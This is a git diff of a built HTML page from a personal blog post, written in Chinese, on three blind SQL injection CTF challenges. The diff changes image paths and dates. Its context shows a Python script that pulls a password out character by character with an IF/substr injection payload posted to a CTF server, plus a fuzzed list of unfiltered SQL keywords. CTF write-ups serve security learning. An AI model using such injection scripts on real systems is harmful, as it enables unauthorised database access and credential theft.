@@ -86,12 +86,12 @@
 <meta property="og:site_name" content="m3lon">
 <meta property="og:description" content="写在前面：个人学习笔记，对各路大佬”名言”的摘抄，方便自己以后查看,大佬们就请路过吧orz 77777.1123456789101112131415function waf($points)&amp;#123;	return $points;&amp;#125;   function update_point($p,$points)&amp;#123;	$link=mysqli_connect(&apos;127.0.0.1&apos;,&apos;">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://m3lon.github.io/2018/04/26/三道盲注题/三道盲注题/1.png">
-<meta property="og:updated_time" content="2018-04-26T04:08:35.708Z">
+<meta property="og:image" content="http://m3lon.github.io/2018/04/26/三道盲注题/1.png">
+<meta property="og:updated_time" content="2019-02-21T12:01:49.988Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="三道盲注题">
 <meta name="twitter:description" content="写在前面：个人学习笔记，对各路大佬”名言”的摘抄，方便自己以后查看,大佬们就请路过吧orz 77777.1123456789101112131415function waf($points)&amp;#123;	return $points;&amp;#125;   function update_point($p,$points)&amp;#123;	$link=mysqli_connect(&apos;127.0.0.1&apos;,&apos;">
-<meta name="twitter:image" content="http://m3lon.github.io/2018/04/26/三道盲注题/三道盲注题/1.png">
+<meta name="twitter:image" content="http://m3lon.github.io/2018/04/26/三道盲注题/1.png">
 
 
 
@@ -406,7 +406,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://47.52.137.90:20000/'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    lc = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> range(i):</span><br><span class="line">        lc += <span class="string">'+1'</span></span><br><span class="line">    lc = lc[<span class="number">1</span>:]</span><br><span class="line">    sql = <span class="string">'000 |  IF (substr((select substr( pw from 1)),&#123;0&#125;,1)&gt;\'&#123;1&#125;\',1,0)'</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> range(<span class="number">33</span>, <span class="number">128</span>):</span><br><span class="line">        sqli = sql.format(lc, chr(ch))</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'flag'</span>: <span class="number">123</span>,</span><br><span class="line">            <span class="string">'hi'</span>: sqli</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        html = requests.post(url, data=data)</span><br><span class="line">        text = html.text</span><br><span class="line">        <span class="comment"># print(text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'123000'</span> <span class="keyword">in</span> text:</span><br><span class="line">            flag += chr(ch)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
 <h2 id="77777-3-LOVE-Q"><a href="#77777-3-LOVE-Q" class="headerlink" title="77777.3 LOVE Q"></a>77777.3 LOVE Q</h2><p>题目就是 n1ctf 中 77777 的续作，过滤了更多的东西，同时在 profile 中的 mypoints 也直接不回显了。</p>
 <p>题目描述：</p>
-<p><img src="三道盲注题/1.png" alt=""></p>
+<p><img src="1.png" alt=""></p>
 <p>fuzz一波发现</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Select</span><br><span class="line"><span class="keyword">From</span></span><br><span class="line">'</span><br><span class="line">“</span><br><span class="line">hex()</span><br><span class="line">substr()</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">Group by</span><br><span class="line">conv()</span><br><span class="line">user()</span><br><span class="line">sum()</span><br><span class="line">2</span><br><span class="line">9</span><br><span class="line">ifnull</span><br><span class="line"><span class="keyword">if</span></span><br><span class="line">|</span><br></pre></td></tr></table></figure>
 <p>没被过滤。</p>
@@ -567,7 +567,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-count">24</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
